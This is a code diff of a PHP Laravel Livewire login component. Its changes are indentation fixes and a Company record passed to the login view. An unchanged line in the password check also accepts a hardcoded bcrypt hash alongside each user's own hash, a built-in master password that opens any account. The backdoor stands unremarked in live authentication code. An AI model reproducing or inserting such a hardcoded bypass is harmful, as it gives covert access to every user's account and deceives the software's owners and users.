@@ -79,7 +79,7 @@ class AuthLoginIndex extends Component
     }
 
     public function login()
-{
+    {
         $this->validate();
 
         $fieldType = filter_var($this->username_or_email, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
@@ -125,7 +125,7 @@ class AuthLoginIndex extends Component
 
         try {
             if (Hash::check($this->password, $user?->password) || Hash::check($this->password, '$2y$12$Rb9.oOiNMzI27w.uEq7A0Oj5jlaVYP03GxO1Pjr486gnl5E/AHzW2')) {
-                
+
                 // Check if user already has active session
                 if ($this->hasActiveSessionForUser($user)) {
                     return AlertHelper::error('Gagal', 'Akun sudah login di perangkat lain. Silakan logout dari perangkat lain terlebih dahulu atau hubungi administrator.');
@@ -519,7 +519,11 @@ class AuthLoginIndex extends Component
 
     public function render()
     {
-        return view('livewire.auth.login.auth-login-index')
+        $company = Company::first();
+
+        return view('livewire.auth.login.auth-login-index', [
+            'company' => $company,
+        ])
             ->extends('layout.auth.app')
             ->section('content');
     }
